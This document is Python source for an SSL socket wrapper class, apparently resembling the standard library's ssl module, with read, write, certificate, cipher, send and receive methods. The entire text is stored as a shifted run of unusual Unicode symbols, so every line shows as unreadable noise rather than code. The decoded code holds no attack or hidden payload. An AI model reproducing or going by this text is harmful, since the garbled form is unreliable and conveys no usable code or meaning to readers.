ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚫ꛴꛾ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚭꛝ꛰ꛬꛯꚫ꛺꛹ꚫꛮ꛷꛺꛾꛰ꛯꚫ꛺꛽ꚫ꜀꛹꜂꛽ꛬ꛻꛻꛰ꛯꚫꛞꛞꛗꚫ꛾꛺ꛮ꛶꛰꛿ꚹꚭꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫꛭ꜀꛱꛱꛰꛽ꚫ꛴꛾ꚫ꛹꛺꛿ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹ꛽꛰ꛬꛯꚳ꛷꛰꛹ꚷꚫꛭ꜀꛱꛱꛰꛽ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹ꛽꛰ꛬꛯꚳ꛷꛰꛹ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿ꚫꛞꛞꛗꛐ꛽꛽꛺꛽ꚫꛬ꛾ꚫ꜃ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꜃ꚹꛬ꛽꛲꛾ꛦꚻꛨꚫꛈꛈꚫꛞꛞꛗꛪꛐꛝꛝꛚꛝꛪꛐꛚꛑꚫꛬ꛹ꛯꚫ꛾꛰꛷꛱ꚹ꛾꜀꛻꛻꛽꛰꛾꛾ꛪ꛽ꛬ꛲꛲꛰ꛯꛪ꛰꛺꛱꛾ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫꛭ꜀꛱꛱꛰꛽ꚫ꛴꛾ꚫ꛹꛺꛿ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꚻꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛭꚲꚲꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꜂꛽꛴꛿꛰ꚳ꛾꛰꛷꛱ꚷꚫꛯꛬ꛿ꛬꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛢ꛽꛴꛿꛰ꚫꛏꛌꛟꛌꚫ꛿꛺ꚫ꛿꛳꛰ꚫ꜀꛹ꛯ꛰꛽꛷꜄꛴꛹꛲ꚫꛞꛞꛗꚫꛮ꛳ꛬ꛹꛹꛰꛷ꚹꚫꚫꛝ꛰꛿꜀꛽꛹꛾ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛹꜀꛸ꛭ꛰꛽ꚫ꛺꛱ꚫꛭ꜄꛿꛰꛾ꚫ꛺꛱ꚫꛏꛌꛟꛌꚫꛬꛮ꛿꜀ꛬ꛷꛷꜄ꚫ꛿꛽ꛬ꛹꛾꛸꛴꛿꛿꛰ꛯꚹꚭꚭꚭꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛮ꛳꛰ꛮ꛶ꛎ꛷꛺꛾꛰ꛯꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚫ꛴꛾ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚭꛢ꛽꛴꛿꛰ꚫ꛺꛹ꚫꛮ꛷꛺꛾꛰ꛯꚫ꛺꛽ꚫ꜀꛹꜂꛽ꛬ꛻꛻꛰ꛯꚫꛞꛞꛗꚫ꛾꛺ꛮ꛶꛰꛿ꚹꚭꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹ꜂꛽꛴꛿꛰ꚳꛯꛬ꛿ꛬꚴꚕꚕꚫꚫꚫꚫꛋꛪ꛾꛾꛷ꛮ꛺꛻꜄ꛯ꛺ꛮꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛲꛰꛿꛻꛰꛰꛽ꛮ꛰꛽꛿ꚳ꛾꛰꛷꛱ꚷꚫꛭ꛴꛹ꛬ꛽꜄ꛪ꛱꛺꛽꛸ꛈꛑꛬ꛷꛾꛰ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛮ꛳꛰ꛮ꛶ꛎ꛷꛺꛾꛰ꛯꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛮ꛳꛰ꛮ꛶ꛪꛮ꛺꛹꛹꛰ꛮ꛿꛰ꛯꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹ꛲꛰꛿꛻꛰꛰꛽ꛮ꛰꛽꛿ꚳꛭ꛴꛹ꛬ꛽꜄ꛪ꛱꛺꛽꛸ꚴꚕꚕꚫꚫꚫꚫꛋꛪ꛾꛾꛷ꛮ꛺꛻꜄ꛯ꛺ꛮꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛾꛰꛷꛰ꛮ꛿꛰ꛯꛪ꛹꛻꛹ꛪ꛻꛽꛺꛿꛺ꛮ꛺꛷ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛮ꛳꛰ꛮ꛶ꛎ꛷꛺꛾꛰ꛯꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꜂ꛬ꛽꛹꛴꛹꛲꛾ꚹ꜂ꛬ꛽꛹ꚳꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚭ꛾꛾꛷ꚫꛙꛛꛙꚫ꛴꛾ꚫꛯ꛰꛻꛽꛰ꛮꛬ꛿꛰ꛯꚷꚫ꜀꛾꛰ꚫꛌꛗꛛꛙꚫ꛴꛹꛾꛿꛰ꛬꛯꚭꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛏ꛰꛻꛽꛰ꛮꛬ꛿꛴꛺꛹ꛢꛬ꛽꛹꛴꛹꛲ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛿ꛬꛮ꛶꛷꛰꜁꛰꛷ꛈꚽꚕꚫꚫꚫꚫꚫꚫꚫꚫꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛙ꛺꛹꛰ꚕꚕꚫꚫꚫꚫꛋꛪ꛾꛾꛷ꛮ꛺꛻꜄ꛯ꛺ꛮꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛾꛰꛷꛰ꛮ꛿꛰ꛯꛪꛬ꛷꛻꛹ꛪ꛻꛽꛺꛿꛺ꛮ꛺꛷ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛮ꛳꛰ꛮ꛶ꛎ꛷꛺꛾꛰ꛯꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚫ꛴꛾ꚫꛙ꛺꛹꛰ꚫ꛺꛽ꚫ꛹꛺꛿ꚫꛪ꛾꛾꛷ꚹꛓꛌꛞꛪꛌꛗꛛꛙꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛙ꛺꛹꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹ꛾꛰꛷꛰ꛮ꛿꛰ꛯꛪꛬ꛷꛻꛹ꛪ꛻꛽꛺꛿꛺ꛮ꛺꛷ꚳꚴꚕꚕꚫꚫꚫꚫꛋꛪ꛾꛾꛷ꛮ꛺꛻꜄ꛯ꛺ꛮꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛮ꛴꛻꛳꛰꛽ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛮ꛳꛰ꛮ꛶ꛎ꛷꛺꛾꛰ꛯꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚫ꛴꛾ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛙ꛺꛹꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹꛮ꛴꛻꛳꛰꛽ꚳꚴꚕꚕꚫꚫꚫꚫꛋꛪ꛾꛾꛷ꛮ꛺꛻꜄ꛯ꛺ꛮꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛾꛳ꛬ꛽꛰ꛯꛪꛮ꛴꛻꛳꛰꛽꛾ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛮ꛳꛰ꛮ꛶ꛎ꛷꛺꛾꛰ꛯꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚫ꛴꛾ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛙ꛺꛹꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹ꛾꛳ꛬ꛽꛰ꛯꛪꛮ꛴꛻꛳꛰꛽꛾ꚳꚴꚕꚕꚫꚫꚫꚫꛋꛪ꛾꛾꛷ꛮ꛺꛻꜄ꛯ꛺ꛮꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛮ꛺꛸꛻꛽꛰꛾꛾꛴꛺꛹ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛮ꛳꛰ꛮ꛶ꛎ꛷꛺꛾꛰ꛯꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚫ꛴꛾ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛙ꛺꛹꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹꛮ꛺꛸꛻꛽꛰꛾꛾꛴꛺꛹ꚳꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛾꛰꛹ꛯꚳ꛾꛰꛷꛱ꚷꚫꛯꛬ꛿ꛬꚷꚫ꛱꛷ꛬ꛲꛾ꛈꚻꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛮ꛳꛰ꛮ꛶ꛎ꛷꛺꛾꛰ꛯꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚫ꛴꛾ꚫ꛹꛺꛿ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛱꛷ꛬ꛲꛾ꚫꚬꛈꚫꚻꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚭ꛹꛺꛹ꚸ꜅꛰꛽꛺ꚫ꛱꛷ꛬ꛲꛾ꚫ꛹꛺꛿ꚫꛬ꛷꛷꛺꜂꛰ꛯꚫ꛴꛹ꚫꛮꛬ꛷꛷꛾ꚫ꛿꛺ꚫ꛾꛰꛹ꛯꚳꚴꚫ꛺꛹ꚫꚰ꛾ꚭꚫꚰꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛪꛮ꛷ꛬ꛾꛾ꛪꛪꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹ꜂꛽꛴꛿꛰ꚳꛯꛬ꛿ꛬꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꜀꛻꛰꛽ꚳꚴꚹ꛾꛰꛹ꛯꚳꛯꛬ꛿ꛬꚷꚫ꛱꛷ꛬ꛲꛾ꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛾꛰꛹ꛯ꛿꛺ꚳ꛾꛰꛷꛱ꚷꚫꛯꛬ꛿ꛬꚷꚫ꛱꛷ꛬ꛲꛾ꛪ꛺꛽ꛪꛬꛯꛯ꛽ꚷꚫꛬꛯꛯ꛽ꛈꛙ꛺꛹꛰ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛮ꛳꛰ꛮ꛶ꛎ꛷꛺꛾꛰ꛯꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚫ꛴꛾ꚫ꛹꛺꛿ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚭ꛾꛰꛹ꛯ꛿꛺ꚫ꛹꛺꛿ꚫꛬ꛷꛷꛺꜂꛰ꛯꚫ꛺꛹ꚫ꛴꛹꛾꛿ꛬ꛹ꛮ꛰꛾ꚫ꛺꛱ꚫꚰ꛾ꚭꚫꚰꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛪꛮ꛷ꛬ꛾꛾ꛪꛪꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛴꛱ꚫꛬꛯꛯ꛽ꚫ꛴꛾ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꜀꛻꛰꛽ꚳꚴꚹ꛾꛰꛹ꛯ꛿꛺ꚳꛯꛬ꛿ꛬꚷꚫ꛱꛷ꛬ꛲꛾ꛪ꛺꛽ꛪꛬꛯꛯ꛽ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꜀꛻꛰꛽ꚳꚴꚹ꛾꛰꛹ꛯ꛿꛺ꚳꛯꛬ꛿ꛬꚷꚫ꛱꛷ꛬ꛲꛾ꛪ꛺꛽ꛪꛬꛯꛯ꛽ꚷꚫꛬꛯꛯ꛽ꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛾꛰꛹ꛯ꛸꛾꛲ꚳ꛾꛰꛷꛱ꚷꚫꚵꛬ꛽꛲꛾ꚷꚫꚵꚵ꛶꜂ꛬ꛽꛲꛾ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛐ꛹꛾꜀꛽꛰ꚫ꛻꛽꛺꛲꛽ꛬ꛸꛾ꚫꛯ꛺꛹ꚲ꛿ꚫ꛾꛰꛹ꛯꚫꛯꛬ꛿ꛬꚫ꜀꛹꛰꛹ꛮ꛽꜄꛻꛿꛰ꛯꚫ꛴꛱ꚫ꛿꛳꛰꜄ꚫ꛿꛽꜄ꚫ꛿꛺ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꜀꛾꛰ꚫ꛿꛳꛴꛾ꚫ꛸꛰꛿꛳꛺ꛯꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛙ꛺꛿ꛔ꛸꛻꛷꛰꛸꛰꛹꛿꛰ꛯꛐ꛽꛽꛺꛽ꚳꚭ꛾꛰꛹ꛯ꛸꛾꛲ꚫ꛹꛺꛿ꚫꛬ꛷꛷꛺꜂꛰ꛯꚫ꛺꛹ꚫ꛴꛹꛾꛿ꛬ꛹ꛮ꛰꛾ꚫ꛺꛱ꚫꚰ꛾ꚭꚫꚰꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛪꛮ꛷ꛬ꛾꛾ꛪꛪꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛾꛰꛹ꛯꛬ꛷꛷ꚳ꛾꛰꛷꛱ꚷꚫꛯꛬ꛿ꛬꚷꚫ꛱꛷ꛬ꛲꛾ꛈꚻꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛮ꛳꛰ꛮ꛶ꛎ꛷꛺꛾꛰ꛯꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚫ꛴꛾ꚫ꛹꛺꛿ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛱꛷ꛬ꛲꛾ꚫꚬꛈꚫꚻꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚭ꛹꛺꛹ꚸ꜅꛰꛽꛺ꚫ꛱꛷ꛬ꛲꛾ꚫ꛹꛺꛿ꚫꛬ꛷꛷꛺꜂꛰ꛯꚫ꛴꛹ꚫꛮꛬ꛷꛷꛾ꚫ꛿꛺ꚫ꛾꛰꛹ꛯꛬ꛷꛷ꚳꚴꚫ꛺꛹ꚫꚰ꛾ꚭꚫꚰꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛪꛮ꛷ꛬ꛾꛾ꛪꛪꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛺꜀꛹꛿ꚫꛈꚫꚻꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꜂꛴꛿꛳ꚫ꛸꛰꛸꛺꛽꜄꜁꛴꛰꜂ꚳꛯꛬ꛿ꛬꚴꚫꛬ꛾ꚫ꜁꛴꛰꜂ꚷꚫ꜁꛴꛰꜂ꚹꛮꛬ꛾꛿ꚳꚭꛍꚭꚴꚫꛬ꛾ꚫꛭ꜄꛿꛰ꛪ꜁꛴꛰꜂ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛬ꛸꛺꜀꛹꛿ꚫꛈꚫ꛷꛰꛹ꚳꛭ꜄꛿꛰ꛪ꜁꛴꛰꜂ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꜂꛳꛴꛷꛰ꚫꛮ꛺꜀꛹꛿ꚫꛇꚫꛬ꛸꛺꜀꛹꛿ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꜁ꚫꛈꚫ꛾꛰꛷꛱ꚹ꛾꛰꛹ꛯꚳꛭ꜄꛿꛰ꛪ꜁꛴꛰꜂ꛦꛮ꛺꜀꛹꛿ꛅꛨꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛺꜀꛹꛿ꚫꚶꛈꚫ꜁ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꜀꛻꛰꛽ꚳꚴꚹ꛾꛰꛹ꛯꛬ꛷꛷ꚳꛯꛬ꛿ꛬꚷꚫ꛱꛷ꛬ꛲꛾ꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛾꛰꛹ꛯ꛱꛴꛷꛰ꚳ꛾꛰꛷꛱ꚷꚫ꛱꛴꛷꛰ꚷꚫ꛺꛱꛱꛾꛰꛿ꛈꚻꚷꚫꛮ꛺꜀꛹꛿ꛈꛙ꛺꛹꛰ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛞ꛰꛹ꛯꚫꛬꚫ꛱꛴꛷꛰ꚷꚫ꛻꛺꛾꛾꛴ꛭ꛷꜄ꚫꛭ꜄ꚫ꜀꛾꛴꛹꛲ꚫ꛺꛾ꚹ꛾꛰꛹ꛯ꛱꛴꛷꛰ꚳꚴꚫ꛴꛱ꚫ꛿꛳꛴꛾ꚫ꛴꛾ꚫꛬꚕꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛷꛰ꛬ꛽ꚸ꛿꛰꜃꛿ꚫ꛾꛺ꛮ꛶꛰꛿ꚹꚫꚫꛝ꛰꛿꜀꛽꛹ꚫ꛿꛳꛰ꚫ꛿꛺꛿ꛬ꛷ꚫ꛹꜀꛸ꛭ꛰꛽ꚫ꛺꛱ꚫꛭ꜄꛿꛰꛾ꚫ꛾꛰꛹꛿ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚫ꛴꛾ꚫ꛹꛺꛿ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛰꛹ꛯ꛱꛴꛷꛰ꛪ꜀꛾꛰ꛪ꛾꛰꛹ꛯꚳ꛱꛴꛷꛰ꚷꚫ꛺꛱꛱꛾꛰꛿ꚷꚫꛮ꛺꜀꛹꛿ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛺꛾ꚹ꛾꛰꛹ꛯ꛱꛴꛷꛰ꚳꚴꚫ꜂꛺꛽꛶꛾ꚫ꜂꛴꛿꛳ꚫ꛻꛷ꛬ꛴꛹ꚫ꛾꛺ꛮ꛶꛰꛿꛾ꚫ꛺꛹꛷꜄ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꜀꛻꛰꛽ꚳꚴꚹ꛾꛰꛹ꛯ꛱꛴꛷꛰ꚳ꛱꛴꛷꛰ꚷꚫ꛺꛱꛱꛾꛰꛿ꚷꚫꛮ꛺꜀꛹꛿ꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛽꛰ꛮ꜁ꚳ꛾꛰꛷꛱ꚷꚫꛭ꜀꛱꛷꛰꛹ꛈꚼꚻꚽꚿꚷꚫ꛱꛷ꛬ꛲꛾ꛈꚻꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛮ꛳꛰ꛮ꛶ꛎ꛷꛺꛾꛰ꛯꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚫ꛴꛾ꚫ꛹꛺꛿ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛱꛷ꛬ꛲꛾ꚫꚬꛈꚫꚻꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚭ꛹꛺꛹ꚸ꜅꛰꛽꛺ꚫ꛱꛷ꛬ꛲꛾ꚫ꛹꛺꛿ꚫꛬ꛷꛷꛺꜂꛰ꛯꚫ꛴꛹ꚫꛮꛬ꛷꛷꛾ꚫ꛿꛺ꚫ꛽꛰ꛮ꜁ꚳꚴꚫ꛺꛹ꚫꚰ꛾ꚭꚫꚰꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪꛪꛮ꛷ꛬ꛾꛾ꛪꛪꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹ꛽꛰ꛬꛯꚳꛭ꜀꛱꛷꛰꛹ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꜀꛻꛰꛽ꚳꚴꚹ꛽꛰ꛮ꜁ꚳꛭ꜀꛱꛷꛰꛹ꚷꚫ꛱꛷ꛬ꛲꛾ꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛽꛰ꛮ꜁ꛪ꛴꛹꛿꛺ꚳ꛾꛰꛷꛱ꚷꚫꛭ꜀꛱꛱꛰꛽ꚷꚫ꛹ꛭ꜄꛿꛰꛾ꛈꛙ꛺꛹꛰ꚷ